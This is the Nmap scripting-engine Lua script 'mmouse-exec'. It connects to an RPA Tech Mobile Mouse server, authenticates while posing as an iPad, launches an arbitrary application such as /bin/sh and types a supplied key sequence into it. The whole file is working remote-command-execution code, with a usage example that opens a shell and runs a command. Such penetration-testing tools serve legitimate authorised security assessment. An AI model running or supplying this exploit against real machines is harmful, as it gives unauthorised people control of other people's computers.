local creds = require "creds"
local match = require "match"
local nmap = require "nmap"
local shortport = require "shortport"
local stdnse = require "stdnse"

description = [[
Connects to an RPA Tech Mobile Mouse server, starts an application and
sends a sequence of keys to it. Any application that the user has
access to can be started and the key sequence is sent to the
application after it has been started.

The Mobile Mouse server runs on OS X, Windows and Linux and enables remote
control of the keyboard and mouse from an iOS device. For more information:
http://mobilemouse.com/

The script has only been tested against OS X and will detect the remote OS
and abort unless the OS is detected as Mac.
]]

---
-- @usage
-- nmap -p 51010 <host> --script mmouse-exec \
--   --script-args application='/bin/sh',keys='ping -c 5 127.0.0.1'
--
-- @output
-- PORT      STATE SERVICE REASON
-- 51010/tcp open  unknown syn-ack
-- | mmouse-exec:
-- |_  Attempted to start application "/bin/sh" and sent "ping -c 5 127.0.0.1"
--
-- @args mmouse-exec.password The password needed to connect to the mobile
--       mouse server
-- @args mmouse-exec.application The application which is to be started at the
--       server
-- @args mmouse-exec.keys The key sequence to send to the started application
-- @args mmouse-exec.delay Delay in seconds to wait before sending the key
--       sequence. (default: 3 seconds)
--

author = "Patrik Karlsson"
categories = {"intrusive"}
dependencies = {"mmouse-brute"}


local arg_password = stdnse.get_script_args(SCRIPT_NAME .. '.password')
local arg_app      = stdnse.get_script_args(SCRIPT_NAME .. '.application')
local arg_keys     = stdnse.get_script_args(SCRIPT_NAME .. '.keys')
local arg_delay    = stdnse.get_script_args(SCRIPT_NAME .. '.delay') or 3

portrule = shortport.port_or_service(51010, "mmouse", "tcp")

local function receiveData(socket, cmd)
  local status, data = ""
  repeat
    status, data = socket:receive_buf(match.pattern_limit("\04", 2048), true)
    if ( not(status) ) then
      return false, "Failed to receive data from server"
    end
  until( cmd == nil or data:match("^" .. cmd) )
  return true, data
end

local function authenticate(socket, password)
  local devid = "0123456789abcdef0123456789abcdef0123456"
  local devname = "Lord Vaders iPad"
  local suffix = "2".."\30".."2".."\04"
  local auth = ("CONNECT\30%s\30%s\30%s\30%s"):format(password, devid, devname, suffix)

  local status = socket:send(auth)
  if ( not(status) ) then
    return false, "Failed to send data to server"
  end

  local status, data = receiveData(socket)
  if ( not(status) ) then
    return false, "Failed to receive data from server"
  end

  local success, os = data:match("^CONNECTED\30([^\30]*)\30([^\30]*)")

  if ( success == "YES" ) then
    if ( os ~= 'MAC' ) then
      return false, "Non MAC platform detected, script has only been tested on MAC"
    end
    if ( not(socket:send("SETOPTION\30PRESENTATION\30".."1\04")) ) then
      return false, "Failed to send request to server"
    end
    if ( not(socket:send("SETOPTION\30CLIPBOARDSYNC\30".."1\04")) ) then
      return false, "Failed to send request to server"
    end
    return true
  end
  return false, "Authentication failed"
end

local function processSwitchMode(socket, swmode)
  local m, o, a1, a2, p = swmode:match("^(.-)\30(.-)\30(.-)\30(.-)\30(.-)\04$")
  if ( m ~= "SWITCHMODE") then
    stdnse.debug1("Unknown SWITCHMODE: %s %s", m, o)
    return false, "Failed to parse SWITCHMODE"
  end

  local str = ("SWITCHED\30%s\30%s\30%s\04"):format(o, a1, a2)
  local status = socket:send(str)
  if ( not(status) ) then
    return false, "Failed to send data to server"
  end
  return true
end

local function executeCmd(socket, app, keys)
  local exec = ("SENDPROGRAMACTION\30RUN\30%s\04"):format(app)
  local status = socket:send(exec)
  if ( not(status) ) then
    return false, "Failed to send data to server"
  end

  local status, data = receiveData(socket)
  if ( not(status) ) then
    return false, "Failed to receive data from server"
  end

  if ( arg_delay ) then
    stdnse.sleep(tonumber(arg_delay))
  end

  if ( keys ) then
    local cmd = ("KEYSTRING\30%s\n\04"):format(keys)
    if ( not(socket:send(cmd)) ) then
      return false, "Failed to send data to the server"
    end
  end
  return true
end

local function fail(err) return stdnse.format_output(false, err) end

action = function(host, port)

  local c = creds.Credentials:new(creds.ALL_DATA, host, port)
  local credentials = c:getCredentials(creds.State.VALID + creds.State.PARAM)()
  local password = arg_password or (credentials and credentials.pass) or ""

  if ( not(arg_app) ) then
    return fail(("No application was specified (see %s.application)"):format(SCRIPT_NAME))
  end

  if ( not(arg_keys) ) then
    return fail(("No keys were specified (see %s.keys)"):format(SCRIPT_NAME))
  end

  local socket = nmap.new_socket()
  socket:set_timeout(10000)
  local status, err = socket:connect(host, port)
  if ( not(status) ) then
    return fail("Failed to connect to server")
  end

  status, err = authenticate(socket, password)
  if ( not(status) ) then
    return fail(err)
  end

  local data
  status, data = receiveData(socket, "SWITCHMODE")
  if ( not(status) ) then
    return fail("Failed to receive expected response from server")
  end

  if ( not(processSwitchMode(socket, data)) ) then
    return fail("Failed to process SWITCHMODE command")
  end

  if ( not(executeCmd(socket, arg_app, arg_keys)) ) then
    return fail("Failed to execute application")
  end

  return ("\n  Attempted to start application \"%s\" and sent \"%s\""):format(arg_app, arg_keys)
end
